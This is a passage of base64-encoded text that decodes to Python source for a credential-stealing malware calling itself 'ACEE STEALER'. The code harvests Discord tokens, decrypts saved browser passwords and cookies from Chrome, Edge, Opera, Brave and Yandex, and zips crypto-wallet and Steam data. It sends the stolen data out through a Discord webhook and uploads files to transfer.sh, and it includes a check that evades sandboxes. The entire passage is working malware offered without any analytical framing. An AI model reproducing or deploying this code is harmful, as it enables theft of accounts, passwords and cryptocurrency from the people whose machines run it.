VuKFJlcXVlc3QoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKICAgIGlmICJ3cGNvb2siIGluIG5hbWU6CiAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBjb29raVdvcmRzKQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOgogICAgICAgICAgICBycnJyciA9IFJlZm9ybWF0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJGb3VuZDoiLAogICAgICAgICAgICAgICAgInZhbHVlIjogcmIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICJuYW1lIjogIkFDRUUgfCBDb29raWVzIFN0ZWFsZXIiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQUNFRSBTVEVBTEVSIiwKICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCiAgICAjIHIgPSByZXF1ZXN0cy5wb3N0KGhvb2ssIGZpbGVzPWZpbGVzKQogICAgTG9hZFJlcXVlc3RzKCJQT1NUIiwgaG9vaywgZmlsZXM9ZmlsZXMpCgpkZWYgd3JpdGVmb3JmaWxlKGRhdGEsIG5hbWUpOgogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJcd3B7bmFtZX0udHh0IgogICAgd2l0aCBvcGVuKHBhdGgsIG1vZGU9J3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgIGYud3JpdGUoZiI8LS1BQ0VFIFNURUFMRVIgT04gVE9QLS0+XG5cbiIpCiAgICAgICAgZm9yIGxpbmUgaW4gZGF0YToKICAgICAgICAgICAgaWYgbGluZVswXSAhPSAnJzoKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpCgpUb2tlbnMgPSAnJwpkZWYgZ2V0VG9rZW4ocGF0aCwgYXJnKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aCArPSBhcmcKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aCk6CiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSIsIHIibWZhXC5bXHctXXs4MCw5NX0iKToKICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW4gaW4gVG9rZW5zOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVG9rZW5zICs9IHRva2VuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW4sIHBhdGgpCgpQYXNzdyA9IFtdCmRlZiBnZXRQYXNzdyhwYXRoLCBhcmcpOgogICAgZ2xvYmFsIFBhc3N3CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCgogICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkKICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zOyIpCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFBhc3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgIyBwcmludChbcm93WzBdLCByb3dbMV0sIERlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpXSkKICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykKCkNvb2tpZXMgPSBbXQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0Nvb2tpZXMiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikKICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQogICAgd3JpdGVmb3JmaWxlKENvb2tpZXMsICdjb29rJykKCmRlZiBHZXREaXNjb3JkKHBhdGgsIGFyZyk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH0vTG9jYWwgU3RhdGUiKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKICAgICMgcHJpbnQocGF0aCwgbWFzdGVyX2tleSkKCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICAjIHByaW50KHBhdGgsIGZpbGUpCiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwociJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiLCBsaW5lKToKICAgICAgICAgICAgICAgICAgICBnbG9iYWwgVG9rZW5zCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW5EZWNvZGVkKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRva2VuRGVjb2RlZCBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVG9rZW5zICs9IHRva2VuRGVjb2RlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB3cml0ZWZvcmZpbGUoVG9rZW5zLCAndG9rZW5zJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkKCgpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOgogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpCiAgICAjIG9zLnN5c3RlbShmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mIikKCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoKICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoJyAnLCAnJykKICAgICAgICBuYW1lID0gZiJNZXRhbWFza197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYie2Jyb3dzZXJ9IgoKICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOiByZXR1cm4KICAgICAgICBmID0gb3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCAicisiLCBlbmNvZGluZz0idXRmOCIpCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkKICAgICAgICAjIHByaW50KGRhdGEpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZTogemYud3JpdGUocGF0aEMgKyAiLyIgKyBmaWxlKQogICAgemYuY2xvc2UoKQoKICAgIHVwbG9hZChmJ3twYXRoQ30ve25hbWV9LnppcCcpCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQoKCmRlZiBHYXRoZXJBbGwoKToKICAgICcgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBQYXRoIDwgMCA+ICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc05hbWUgPCAxID4gICAgICAgIFRva2VuICA8IDIgPiAgICAgICAgICAgICAgUGFzc3dvcmQgPCAzID4gICAgIENvb2tpZXMgPCA0ID4gICAgICAgICAgICAgICAgICAgICAgICAgIEV4dGVudGlvbnMgPCA1ID4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsICAgICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXQogICAgXQoKICAgIGRpc2NvcmRQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0xpZ2h0Y29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRjYW5hcnkiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgIF0KCiAgICBQYXRoc1RvWmlwID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdCiAgICBdCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRUb2tlbiwgYXJncz1bcGF0dFswXSwgcGF0dFsyXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKICAgIGZvciBwYXR0IGluIGRpc2NvcmRQYXRoczoKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIFRoQ29rayA9IFtdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldENvb2tpZSwgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhDb2trLmFwcGVuZChhKQoKICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpCiAgICBERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpCiAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQoKICAgIGZvciBwYXR0IGluIFBhdGhzVG9aaXA6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkuc3RhcnQoKQoKICAgIGZvciB0aHJlYWQgaW4gVGhyZWFkbGlzdDoKICAgICAgICB0aHJlYWQuam9pbigpCiAgICBnbG9iYWwgdXB0aHMKICAgIHVwdGhzID0gW10KCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXToKICAgICAgICB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkKCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IHsgImZpbGUiOiAocGF0aCwgb3BlbihwYXRoLCBtb2RlPSdyYicpKSB9CiAgICAgICAgLi4uCiAgICAgICAgdXBsb2FkID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly90cmFuc2Zlci5zaC8iLCBmaWxlcz1maWxlcykKICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAogICAgICAgIHJldHVybiB1cmwKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBncmFiX3Rva2VucygpOgogICAgdG9rZW5fY291bnQgPSAwCiAgICBtZXNzYWdlID0gIiIKICAgIAogICAgbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCiAgICByb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCiAgICB0b2tlbnBhdGhzID0gewogICAgICAgICdEaXNjb3JkJzogcm9hbWluZyArICdcXERpc2NvcmQnLAogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywKICAgICAgICAnRGlzY29yZCBQVEInOiByb2FtaW5nICsgJ1xcZGlzY29yZHB0YicsCiAgICAgICAgJ0dvb2dsZSBDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywKICAgICAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnCiAgICB9CiAgICAKICAgIGRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgICAgICBwYXRoICs9ICdcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGInCgogICAgICAgIHRva2VucyA9IFtdCgogICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3M